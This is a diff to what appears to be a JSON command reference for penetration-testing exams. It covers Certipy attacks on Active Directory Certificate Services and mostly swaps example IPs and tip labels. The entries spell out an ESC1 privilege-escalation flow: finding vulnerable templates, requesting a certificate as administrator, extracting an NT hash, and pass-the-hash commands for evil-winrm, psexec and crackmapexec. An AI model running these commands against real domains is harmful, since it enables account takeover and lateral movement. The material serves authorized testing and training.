@@ -29,7 +29,7 @@
         {
           "name": "<DC_IP>",
           "description": "Domain controller IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         }
       ],
@@ -72,8 +72,8 @@
         "Connection refused": "Check DC IP and port 389/636 accessibility",
         "Invalid credentials": "Verify username format (user@domain) and password"
       },
-      "notes": "CERTIPY is the primary Linux tool for ADCS enumeration and exploitation.\n\nWHAT IT FINDS:\n- ESC1: Template allows requestor to supply Subject Alternative Name (SAN)\n- ESC2: Template has 'Any Purpose' EKU or no EKU\n- ESC3: Certificate Request Agent templates\n- ESC4: Vulnerable template ACLs (WriteDacl, WriteOwner, etc.)\n- ESC5: Vulnerable PKI object ACLs\n- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n- ESC7: ManageCA/ManageCertificates permissions\n- ESC8: HTTP enrollment with NTLM relay\n- ESC9-13: Various certificate binding weaknesses\n\ncertification TIP:\nADCS is increasingly common in exams. ESC1 and ESC4 are most exploitable.",
-      "filled_example": "certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 192.168.50.70 -vulnerable -stdout"
+      "notes": "CERTIPY is the primary Linux tool for ADCS enumeration and exploitation.\n\nWHAT IT FINDS:\n- ESC1: Template allows requestor to supply Subject Alternative Name (SAN)\n- ESC2: Template has 'Any Purpose' EKU or no EKU\n- ESC3: Certificate Request Agent templates\n- ESC4: Vulnerable template ACLs (WriteDacl, WriteOwner, etc.)\n- ESC5: Vulnerable PKI object ACLs\n- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n- ESC7: ManageCA/ManageCertificates permissions\n- ESC8: HTTP enrollment with NTLM relay\n- ESC9-13: Various certificate binding weaknesses\n\nPRACTICAL TIP:\nADCS is increasingly common in exams. ESC1 and ESC4 are most exploitable.",
+      "filled_example": "certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.70 -vulnerable -stdout"
     },
     {
       "id": "certipy-req-esc1",
@@ -161,7 +161,7 @@
         "CERTSRV_E_TEMPLATE_DENIED": "User cannot enroll in this template - check ACLs",
         "Template not found": "Verify exact template name from certipy find"
       },
-      "notes": "ESC1 ATTACK:\nTemplates with 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' allow requestor to specify the Subject Alternative Name (SAN).\n\nThis means you can request a certificate for ANY user (including administrator@domain).\n\nATTACK FLOW:\n1. certipy find -vulnerable (identify ESC1 templates)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy auth -pfx admin.pfx (authenticate with cert to get NT hash)\n\nREQUIREMENTS:\n- Template must allow client authentication (EKU)\n- Attacker must have enrollment rights on template\n- CA must be accessible\n\ncertification TIP:\nESC1 is the most common and easiest ADCS attack. Always check for it first.",
+      "notes": "ESC1 ATTACK:\nTemplates with 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' allow requestor to specify the Subject Alternative Name (SAN).\n\nThis means you can request a certificate for ANY user (including administrator@domain).\n\nATTACK FLOW:\n1. certipy find -vulnerable (identify ESC1 templates)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy auth -pfx admin.pfx (authenticate with cert to get NT hash)\n\nREQUIREMENTS:\n- Template must allow client authentication (EKU)\n- Attacker must have enrollment rights on template\n- CA must be accessible\n\nPRACTICAL TIP:\nESC1 is the most common and easiest ADCS attack. Always check for it first.",
       "filled_example": "certipy req -u 'user@corp.local' -p 'P@ssw0rd123!' -ca 'corp-CA' -target 'ca.corp.local' -template 'UserAuth' -upn 'administrator@corp.local'"
     },
     {
@@ -181,7 +181,7 @@
         {
           "name": "<DC_IP>",
           "description": "Domain controller IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         }
       ],
@@ -221,7 +221,7 @@
         "KDC_ERR_CLIENT_NOT_TRUSTED": "Certificate not trusted - check CA chain"
       },
       "notes": "PKINIT AUTHENTICATION:\nUses certificate to request TGT via Kerberos PKINIT.\n\nThe DC returns the user's NT hash encrypted with the session key.\n\nCertipy extracts this hash for pass-the-hash attacks.\n\nOUTPUT:\nReturns NT hash that can be used with:\n- Evil-WinRM: evil-winrm -i <target> -u <user> -H <hash>\n- PSExec: impacket-psexec <domain>/<user>@<target> -hashes :<hash>\n- CrackMapExec: cme smb <target> -u <user> -H <hash>",
-      "filled_example": "certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.50.70"
+      "filled_example": "certipy auth -pfx 'administrator.pfx' -dc-ip 10.10.10.70"
     },
     {
       "id": "certipy-req-esc4",
